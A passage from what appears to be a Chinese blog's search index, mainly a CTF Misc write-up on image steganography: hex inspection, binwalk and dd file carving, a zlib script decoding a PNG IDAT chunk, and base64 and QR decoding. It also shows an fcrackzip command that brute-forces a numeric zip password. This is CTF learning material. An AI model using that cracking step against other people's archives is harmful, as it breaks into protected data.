title="3.相关资源"></a>3.相关资源</h2><ul><li>web安全相关地址：<a href="https://websec.readthedocs.io/zh/latest/">https://websec.readthedocs.io/zh/latest/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Misc——图片隐写</title>
    <link href="/2021/11/07/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
    <url>/2021/11/07/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc——图片隐写"><a href="#Misc——图片隐写" class="headerlink" title="Misc——图片隐写"></a>Misc——图片隐写</h1><p>（并非全部情况，这里仅讲述自己在玩Misc板块题目时遇到的，也算是提供一些思路）</p><h4 id="情况1：打开图片即得flag"><a href="#情况1：打开图片即得flag" class="headerlink" title="情况1：打开图片即得flag"></a>情况1：打开图片即得flag</h4><h4 id="情况2：改变后缀获得flag"><a href="#情况2：改变后缀获得flag" class="headerlink" title="情况2：改变后缀获得flag"></a>情况2：改变后缀获得flag</h4><p>&emsp;&emsp;使用对应软件获悉是个png图片，改为png后缀打开获得flag</p><h4 id="情况3：图片里的信息附加"><a href="#情况3：图片里的信息附加" class="headerlink" title="情况3：图片里的信息附加"></a>情况3：图片里的信息附加</h4><p>&emsp;&emsp;使用winhex打开对应文件、在文件对应的进制当中存在flag</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1.png" style="zoom:67%;" /></center><h4 id="情况4：图片里的隐藏文件"><a href="#情况4：图片里的隐藏文件" class="headerlink" title="情况4：图片里的隐藏文件"></a>情况4：图片里的隐藏文件</h4><p>&emsp;&emsp;使用linux里面的binwalk、foremost命令，从而找出文件中的隐藏文件，从而找到flag</p><p><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/2.png"></p><p>&emsp;&emsp;使用binwalk发现在png下面藏zip文件，使用dd分离出zip文件  </p><p><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/3.png"></p><p>&emsp;&emsp;skip=471、count=650是对应参数，bs表示设置文件的大小为多少MB，得到提示是4位数的密码压缩包 。</p><p>&emsp;&emsp;用kali的 fcrackzip进行解压，命令格式现在我们使用命令 fcrackzip -b -c ‘1’ -l 1-6 -u test.zip ，-b(使用暴力破解方式)，-c‘1’（密码中只有数字），-l（密码长度为1-6）， -u（目标名称）。我们通过暴力破解成功获得了压缩包密码。</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/4.png" style="zoom:67%;" /></center><h4 id="情况5：图片问题内容提示"><a href="#情况5：图片问题内容提示" class="headerlink" title="情况5：图片问题内容提示"></a>情况5：图片问题内容提示</h4><p>&emsp;&emsp;首先打开会有短的idat块显示有异常：</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/5.png" style="zoom:67%;" /></center><p>&emsp;&emsp;接着直接使用idat合成另外一组图片，使用zlib脚本进行压缩</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import zlib<br>import binascii<br><br>IDAT=<span class="hljs-string">&quot;789C4B2E492BCEC82FAF363635363235323132494C36B34C4E3233493333313637B3B030354C4C36B734A8050009960BD1&quot;</span><span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><br>result=binascii<span class="hljs-selector-class">.hexlify</span>(zlib<span class="hljs-selector-class">.decompress</span>(IDAT))<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(result)</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/6.png"></p><p>&emsp;&emsp;16进制转一下即可得到flag</p><h4 id="情况6：图片问题内容提示-idat删除情况"><a href="#情况6：图片问题内容提示-idat删除情况" class="headerlink" title="情况6：图片问题内容提示(idat删除情况)"></a>情况6：图片问题内容提示(idat删除情况)</h4><p>&emsp;&emsp;有删除第一个idat即可得到flag：</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/7.png" style="zoom: 40%;" /></center><p>&emsp;&emsp;有删除前八个idat即可得到flag：</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/8.png" style="zoom: 35%;" /></center><h4 id="情况7-图片隐藏在64位程序中"><a href="#情况7-图片隐藏在64位程序中" class="headerlink" title="情况7: 图片隐藏在64位程序中"></a>情况7: 图片隐藏在64位程序中</h4><p>&emsp;&emsp;发送了exe程序，但是打不开，使用winhex查看  </p><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/9.png" style="zoom:80%;" /><p>&emsp;&emsp;提示 jpg 和base64，使用base解码</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/10.png" style="zoom:50%;" /></center><p>&emsp;&emsp;解码发现为png文件，打开为二维码</p><center><img src="/img/Misc%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/11.png"/></center><p>&emsp;&emsp;最后扫描二维码得到答案</p>]]></content>
    
    
    <categories>
      
      <category>CTF-Misc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Misc类型导图</title>
    <link href="/2021/10/30/Misc%E7%B1%BB%E5%9E%8B%E5%AF%BC%E5%9B%BE/"/>
    <url>/2021/10/30/Misc%E7%B1%BB%E5%9E%8B%E5%AF%BC%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc类型导图"><a href="#Misc类型导图" class="headerlink" title="Misc类型导图"></a>Misc类型导图</h1><p>&emsp;&emsp;闲来无事突然对Misc的一些板块感兴趣，挺有意思的，抽空看看吧。</p><center><img src="/img/Misc%E7%B1%BB%E5%9E%8B%E5%AF%BC%E5%9B%BE/1.png" /></center>]]></content>
    
    
    <categories>
      
      <category>CTF-Misc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
